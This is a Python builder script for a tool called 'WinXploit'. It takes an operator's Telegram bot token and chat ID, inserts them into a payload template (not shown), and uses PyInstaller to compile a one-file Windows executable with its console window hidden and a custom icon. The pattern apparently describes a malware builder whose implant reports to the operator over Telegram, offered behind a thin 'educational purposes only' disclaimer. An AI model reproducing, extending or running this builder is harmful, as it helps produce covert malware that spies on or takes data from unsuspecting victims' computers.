import os
import subprocess
import shutil

main_program_path = "WinXploit.py"
main_template_path = "main_template.py"
icon_file_path = "WinX.ico"

def print_header():
    os.system("cls" if os.name == "nt" else "clear")  # Clear screen
    print("\033[1;32m" + """
 __          __ _        __   __        _         _  _   
 \ \        / /(_)       \ \ / /       | |       (_)| |  
  \ \  /\  / /  _  _ __   \ V /  _ __  | |  ___   _ | |_ 
   \ \/  \/ /  | || '_ \   > <  | '_ \ | | / _ \ | || __|
    \  /\  /   | || | | | / . \ | |_) || || (_) || || |_ 
     \/  \/    |_||_| |_|/_/ \_\| .__/ |_| \___/ |_| \__|
                                | |                      
                                |_|                      
""" + "\033[0m")

def print_message(message, color=""):
    print(color + message + "\033[0m")  # Reset color to default at the end of the message

# Print header
print_header()

# Disclaimer
print_message("\033;1;31m\n⚠️ DISCLAIMER: Use this software at your own risk. This software is provided for educational purposes only.\nDo not attempt to use this software for any malicious purposes, including but not limited to invading anyone's\nprivacy or unauthorized access to computer systems. The creators and contributors of this software are not \nresponsible for any misuse or damage caused by its use.\n\033[0m", "\033[1;31m")

# Credits
print_message("\nCredits:")
print_message("SIDINSEARCH", "\033[1;33m")

# Get user input
print_message("\nEnter your information:")
TOKEN = input("Enter your Telegram Bot API KEY: ")  # No color specified for this message
CHAT_ID = input("Enter your Telegram Chat ID: ")  # No color specified for this message

# Customize main program
with open(main_template_path, "r", encoding="utf-8") as f:
    template = f.read()

customized = template.replace("YOUR_BOT_ID_PLACEHOLDER", TOKEN)
customized = customized.replace("YOUR_CHAT_ID_PLACEHOLDER", CHAT_ID)

with open(main_program_path, "w", encoding="utf-8") as f:
    f.write(customized)

# Generate exe
command = [
    "pyinstaller",
    main_program_path,
    "--onefile",
    "--noconsole",
    f"--icon={icon_file_path}",
]

print_message("\nRunning PyInstaller...")
subprocess.run(command)

# Get spec file path
spec_file = os.path.join(os.getcwd(), "WinXploit.spec")

# Update spec file
with open(spec_file, "r+") as f:
    content = f.read()
    content = content.replace("console=True", "console=False")
    f.seek(0)
    f.write(content)

# Re-run PyInstaller with updated spec
subprocess.run(["pyinstaller", spec_file])

# Move final exe to the main folder
exe_path = os.path.join("dist", "WinXploit.exe")
final_path = os.path.join(os.getcwd(), "WinXploit.exe")

if os.path.exists(exe_path):
    shutil.move(exe_path, final_path)

# Done message
print_message("\nDone!\n", "\033[1;32m")
